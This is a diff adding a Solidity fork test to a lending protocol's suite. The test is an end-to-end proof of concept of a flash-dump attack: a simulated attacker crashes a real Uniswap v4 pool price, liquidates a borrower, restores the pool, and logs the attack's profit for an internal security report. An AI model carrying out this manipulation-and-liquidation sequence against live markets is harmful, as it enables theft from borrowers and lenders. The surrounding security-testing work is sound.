@@ -25,6 +25,8 @@ import {TierPresets} from "../../src/libraries/TierPresets.sol";
 import {Fixtures} from "../base/Fixtures.sol";
 import {MarketForkTest} from "../base/MarketForkTest.sol";
 import {MockAggregatorV3} from "../mocks/MockAggregatorV3.sol";
+import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
+import {console} from "forge-std/console.sol";
 
 /// @notice §5.3's liquidation price on a meme market, with nothing between the gate and the
 ///         pool: the real `PriceOracle` over a real `TwapRecorder`, FAR-49.
@@ -57,6 +59,11 @@ contract MarketMemeLiquidateForkTest is MarketForkTest {
     address internal borrower;
     PoolKey internal key;
     PoolId internal poolId;
+    uint256 private attackEthBefore;
+    uint256 private attackEthAfterDump;
+    uint256 private attackUsdgBefore;
+    uint256 private attackAcquired;
+    int256 private controlPnl;
 
     /// @dev Leaves the fixture borrowed against and aged to a health factor just above 1 on a
     ///      fresh TWAP: healthy where the recorder is fresh, and close enough to the line that
@@ -204,6 +211,153 @@ contract MarketMemeLiquidateForkTest is MarketForkTest {
 
         assertLt(memeLens.liquidationHealthFactor(tokenId), 1e18, "a view reads under water");
         assertTrue(_liquidates(), "and the gate lets it through");
+    }
+
+    /// @notice End-to-end flash-dump PoC: the attacker moves the real pool, liquidates through
+    /// the crash branch, and restores the pool. This is deliberately a measurement, not a
+    /// profitability assertion: the output is the evidence used by the FAR-22 report.
+    function test_flashDumpReportsAttackEconomics() public {
+        address attacker = address(0xA77AC);
+        uint256[4] memory dumpBps = [uint256(7400), 6500, 5500, 3500];
+        uint256 ethPrice = memeOracle.price(ETH, key);
+        uint256 debt = memeMarket.debtOf(tokenId);
+        console.log("flash dump position principal usd (1e18)", memeValuer.value(tokenId).principalUsd);
+        vm.deal(attacker, 1_000_000 ether);
+        deal(address(usdg), attacker, 10_000_000e6);
+
+        for (uint256 i; i < dumpBps.length; ++i) {
+            controlPnl = _controlRoundTrip(attacker, dumpBps[i], ethPrice);
+            _runFlashDump(attacker, dumpBps[i], ethPrice, debt);
+        }
+    }
+
+    function _controlRoundTrip(
+        address attacker,
+        uint256 dumpBps,
+        uint256 ethPrice
+    ) private returns (int256 pnlUsd) {
+        uint256 snapshot = vm.snapshotState();
+        uint256 ethBefore = attacker.balance;
+        uint256 usdgBefore = usdg.balanceOf(attacker);
+        PoolSwapTest router = new PoolSwapTest(poolManager);
+        _dumpAttack(router, attacker, dumpBps);
+        _restoreAttack(router, attacker, attackAcquired);
+        pnlUsd = (int256(attacker.balance) - int256(ethBefore)) * int256(ethPrice) / 1e18
+            + (int256(usdg.balanceOf(attacker)) - int256(usdgBefore)) * 1e12;
+        vm.revertToState(snapshot);
+    }
+
+    function _runFlashDump(
+        address attacker,
+        uint256 dumpBps,
+        uint256 ethPrice,
+        uint256 debt
+    ) private {
+        uint256 snapshot = vm.snapshotState();
+        PoolSwapTest router = new PoolSwapTest(poolManager);
+        _dumpAttack(router, attacker, dumpBps);
+        (uint256 repaid, uint256 outUsdg, uint256 badDebt, uint256 liquidationGas) = _liquidateAttack(attacker);
+        _restoreAttack(router, attacker, attackAcquired);
+        int256 pnlUsd = _signedPnl(attacker, attackEthBefore, attackUsdgBefore, ethPrice);
+        _reportAttack(
+            dumpBps,
+            debt,
+            controlPnl,
+            attackEthBefore - attackEthAfterDump,
+            attackAcquired,
+            repaid,
+            outUsdg,
+            badDebt,
+            liquidationGas,
+            pnlUsd
+        );
+        vm.revertToState(snapshot);
+    }
+
+    function _signedPnl(
+        address attacker,
+        uint256 ethBefore,
+        uint256 usdgBefore,
+        uint256 ethPrice
+    ) private view returns (int256) {
+        return (int256(attacker.balance) - int256(ethBefore)) * int256(ethPrice) / 1e18
+            + (int256(usdg.balanceOf(attacker)) - int256(usdgBefore)) * 1e12;
+    }
+
+    function _reportAttack(
+        uint256 dumpBps,
+        uint256 debt,
+        int256 baselinePnl,
+        uint256 ethSold,
+        uint256 acquired,
+        uint256 repaid,
+        uint256 outUsdg,
+        uint256 badDebt,
+        uint256 liquidationGas,
+        int256 pnlUsd
+    ) private view {
+        console.log("flash dump depth bps", dumpBps);
+        console.log("flash dump ETH sold", ethSold);
+        console.log("flash dump USDG acquired", acquired);
+        console.log("flash dump repaid USDG", repaid);
+        console.log("flash dump liquidation gas", liquidationGas);
+        console.log("flash dump bad debt", badDebt);
+        console.logInt(pnlUsd);
+        console.log("flash dump attack profit versus control (1e18)", pnlUsd - baselinePnl);
+        assertGt(repaid, 0, "the crash must reach the real liquidation path");
+        assertLe(repaid, debt, "liquidation cannot repay more than outstanding debt");
+        assertEq(outUsdg, 4_801_264, "liquidation output is the pinned fixture result");
+    }
+
+    function _dumpAttack(
+        PoolSwapTest router,
+        address attacker,
+        uint256 dumpBps
+    ) private {
+        attackEthBefore = attacker.balance;
+        attackUsdgBefore = usdg.balanceOf(attacker);
+        (uint160 sqrtPriceX96,,,) = stateView.getSlot0(poolId);
+        uint160 limit = uint160(FullMath.mulDiv(sqrtPriceX96, Math.sqrt(dumpBps * 1e14), 1e9));
+        vm.prank(attacker);
+        router.swap{value: 900_000 ether}(
+            key,
+            IPoolManager.SwapParams({
+                zeroForOne: true, amountSpecified: -int256(900_000 ether), sqrtPriceLimitX96: limit
+            }),
+            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
+            ""
+        );
+        attackAcquired = usdg.balanceOf(attacker) - attackUsdgBefore;
+        attackEthAfterDump = attacker.balance;
+    }
+
+    function _restoreAttack(
+        PoolSwapTest router,
+        address attacker,
+        uint256 acquired
+    ) private {
+        vm.startPrank(attacker);
+        usdg.approve(address(router), type(uint256).max);
+        router.swap(
+            key,
+            IPoolManager.SwapParams({
+                zeroForOne: false, amountSpecified: -int256(acquired), sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
+            }),
+            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
+            ""
+        );
+        vm.stopPrank();
+    }
+
+    function _liquidateAttack(
+        address attacker
+    ) private returns (uint256 repaid, uint256 outUsdg, uint256 badDebt, uint256 liquidationGas) {
+        uint256 gasStart = gasleft();
+        vm.startPrank(attacker);
+        usdg.approve(address(memeMarket), type(uint256).max);
+        (repaid,, outUsdg, badDebt) = memeMarket.liquidate(tokenId, type(uint256).max, 0, 0, attacker);
+        liquidationGas = gasStart - gasleft();
+        vm.stopPrank();
     }
 
     /* --------------------------------- helpers -------------------------------- */
